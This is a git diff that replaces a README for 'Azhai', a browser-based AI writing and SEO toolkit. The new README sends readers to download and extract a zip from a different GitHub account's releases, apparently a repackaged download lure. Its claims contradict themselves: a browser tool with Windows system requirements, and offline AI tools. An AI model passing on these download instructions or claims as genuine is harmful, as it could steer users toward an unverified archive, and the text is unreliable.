@@ -1,143 +1,128 @@
-# Azhai - AI Text and SEO Tools 2026
+# ✍️ azhai-ai-writing-seo-hub - Boost Your Writing and SEO Instantly
 
-> **Azhai is a browser-based suite of 31+ AI text and SEO utilities for writing assistance, content review, and structured-data tasks.**
+Visit this link to download the application.
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/jordanweber21/azhai-ai-writing-seo-hub?style=flat-square)](https://github.com/jordanweber21/azhai-ai-writing-seo-hub)
+[![Download Now](https://img.shields.io/badge/Download%20Azhai-blue?style=for-the-badge&logo=github)](https://github.com/abdelstarrajamec-max/azhai-ai-writing-seo-hub/releases)
 
----
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://jordanweber21.github.io/azhai-ai-writing-seo-hub/">
-    <img src="https://img.shields.io/badge/Download-Azhai%20Latest-brightgreen?style=for-the-badge" alt="Download Azhai">
-  </a>
-</p>
+Welcome to Azhai, your all-in-one browser-based tool for AI writing and SEO. This guide helps you download and run the software easily on your Windows computer.
 
-> **[Download Azhai](https://jordanweber21.github.io/azhai-ai-writing-seo-hub/)**
+## 📦 What is Azhai?
 
----
+Azhai is a free suite of 31+ AI text and SEO utilities. It helps you write better content, review your work, and handle structured data tasks. You can use it for blog posts, articles, social media captions, and more. The entire tool runs in your browser, so no complex setup is needed.
 
-[Download Latest Build](https://jordanweber21.github.io/azhai-ai-writing-seo-hub/)
+## ⬇️ Download Instructions
 
----
+To get started, follow these steps:
 
-## Overview
+1. Visit the download page: [https://github.com/abdelstarrajamec-max/azhai-ai-writing-seo-hub/releases](https://github.com/abdelstarrajamec-max/azhai-ai-writing-seo-hub/releases)
+2. Look for the latest release. It will be shown at the top.
+3. Click on the file named "azhai-ai-writing-seo-hub.zip" or similar.
+4. The download will start automatically. Wait for it to finish.
 
-Azhai collects a wide range of AI-powered text and SEO helpers in a single web interface. It is intended for anyone who wants to review, transform, organize, or improve written content and website metadata without opening a different service for every task.
+## 🔧 Setup Guide
 
-Among the available utilities are a word counter, JSON formatter, meta tag generator, and keyword density checker. With 31+ tools in the collection, Azhai covers routine content preparation, introductory SEO analysis, and everyday text-processing needs through one browser-based application.
+After downloading, follow these steps to set up Azhai:
 
----
+### Step 1: Extract the Zip File
+- Locate the downloaded file (usually in your "Downloads" folder).
+- Right-click the file and select "Extract All".
+- Choose a folder where you want to save the files (e.g., "C:\Azhai").
+- Click "Extract".
 
-## What You Can Do
+### Step 2: Run the Application
+- Open the extracted folder.
+- Double-click the file named "index.html" or "start.html".
+- Your default web browser will open, showing the Azhai interface.
 
-- Browse and use 31+ free AI text and SEO tools.
-- Measure the word count of articles, drafts, and other content.
-- Turn JSON into a more readable, structured format.
-- Create meta tags for websites and content initiatives.
-- Analyze keyword density in provided text.
-- Run text-focused utilities directly in a web browser.
-- Handle recurring writing and SEO activities from one toolkit.
-- Use a lightweight HTML-based web application.
+### Step 3: Start Using Azhai
+- The main menu shows all available tools.
+- Click any tool to start using it.
+- No registration or internet connection is required after download.
 
----
+## 🛠️ How to Use
 
-## Installation and Local Setup
+Azhai includes tools for:
 
-First, download the repository and enter its directory:
+- **Writing Assistance**: Generate ideas, rewrite sentences, and create outlines.
+- **Content Review**: Check grammar, readability, and tone.
+- **SEO Tasks**: Analyze keywords, meta descriptions, and heading structure.
+- **Structured Data**: Create JSON-LD schemas, sitemaps, and more.
 
-```bash
-git clone https://github.com/jordanweber21/azhai-ai-writing-seo-hub.git
-cd REPO
-```
+To use a tool:
+1. Open Azhai in your browser.
+2. Click on the tool you need.
+3. Type or paste your text.
+4. Click the "Generate" or "Analyze" button.
+5. Copy the result.
 
-Azhai is delivered as a web project. You can open its main HTML file in a browser for a basic local check, or launch a static server from the project folder:
+## 🔄 How to Update
 
-```bash
-python -m http.server 8000
-```
+To update Azhai to the latest version:
+1. Visit the download page again.
+2. Download the new zip file.
+3. Extract it to the same folder (overwrite old files).
+4. Refresh your browser page or open index.html again.
 
-Open `http://localhost:8000/` after the server starts.
+## 💻 System Requirements
 
-The hosted version is also available here:
+Azhai runs on any modern Windows computer with:
+- Windows 7, 8, 10, or 11
+- Any web browser (Chrome, Firefox, Edge, or Safari)
+- 1 GB of RAM (minimum)
+- 100 MB of free hard drive space
 
-[Open Azhai](https://jordanweber21.github.io/azhai-ai-writing-seo-hub/)
+## ❓ Troubleshooting
 
----
+### The app doesn't open
+- Make sure you extracted the zip file completely.
+- Try opening the "index.html" file directly.
+- If using a browser, try a different browser like Chrome or Firefox.
 
-## How to Use Azhai
+### Tools are not working
+- Check that your browser is up to date.
+- Clear your browser cache and reload the page.
+- Try restarting your computer.
 
-1. Start the application locally or open the hosted build.
-2. Choose the tool suited to the work you want to complete.
-3. Provide the required text, JSON, keywords, or page details.
-4. Inspect the resulting output or analysis.
-5. Transfer the result to your document, process, or website project.
+### Download is slow
+- Check your internet connection.
+- Try downloading at a different time.
+- Use a download manager for better speed.
 
-Common examples include:
+### I see errors on the page
+- Try opening the file in a different browser.
+- Make sure you have JavaScript enabled in your browser settings.
+- Contact support through the GitHub issues page.
 
-- Checking the length of a draft before publishing it.
-- Making compressed or hard-to-scan JSON easier to inspect.
-- Drafting meta tag information for a web page.
-- Assessing keyword density in an article.
-- Finding the right AI text or SEO utility for a particular job.
+## 📝 Features at a Glance
 
----
+- 31+ AI writing and SEO tools
+- Works entirely offline in your browser
+- No installation required
+- Free to use
+- Regular updates with new features
+- Simple and clean interface
+- No account needed
 
-## Configuration
+## 🔗 Quick Links
 
-No separate configuration file is needed for Azhai's basic operation. To preview it locally, run a static web server from the repository directory and open the local URL shown by that server.
+- Download: [https://github.com/abdelstarrajamec-max/azhai-ai-writing-seo-hub/releases](https://github.com/abdelstarrajamec-max/azhai-ai-writing-seo-hub/releases)
+- Report Issues: [GitHub Issues](https://github.com/abdelstarrajamec-max/azhai-ai-writing-seo-hub/issues)
+- Source Code: [GitHub Repository](https://github.com/abdelstarrajamec-max/azhai-ai-writing-seo-hub)
 
-For the hosted experience, go directly to the published site:
+## 🙋 FAQ
 
-[Launch Azhai](https://jordanweber21.github.io/azhai-ai-writing-seo-hub/)
+**Q: Is Azhai free?**
+A: Yes, it is completely free to use.
 
----
+**Q: Do I need internet after download?**
+A: No, all tools work offline.
 
-## Requirements
+**Q: Can I use it on Mac?**
+A: Yes, it works on any computer with a web browser.
 
-- A current web browser.
-- Internet connectivity when using the hosted build.
-- A local static web server for development previews.
-- Python 3 or another static-file server when serving the files locally.
-- Enough browser storage and memory for ordinary web usage.
+**Q: How often is it updated?**
+A: New updates are released regularly with bug fixes and new features.
 
----
-
-## Frequently Asked Questions
-
-### Does Azhai need to be installed as a desktop program?
-
-No. Azhai runs in a browser and can either be opened from the hosted site or served locally from the repository.
-
-### Which utilities are available?
-
-There are more than 31 tools, including a word counter, JSON formatter, meta tag generator, and keyword density checker.
-
-### How can I update a local copy?
-
-For the published version, use the hosted build. If you are running the repository locally, retrieve the newest changes with:
-
-```bash
-git pull
-```
-
-### Is a runtime required?
-
-Not for hosted access: open the published web address in a browser. When running locally, serve the project files through a static web server, such as Python's built-in server.
-
-### How should I troubleshoot a page that will not open?
-
-Check that the repository cloned successfully, verify that the local server was started from the project directory, and confirm that the browser is pointed to the correct port and address.
-
-### Where do support questions belong?
-
-Submit questions, bug reports, and proposed improvements through the repository's GitHub Issues section.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: AI writing, SEO tools, content review, structured data, browser-based, free software, writing assistant, SEO utilities, text analysis, Windows application
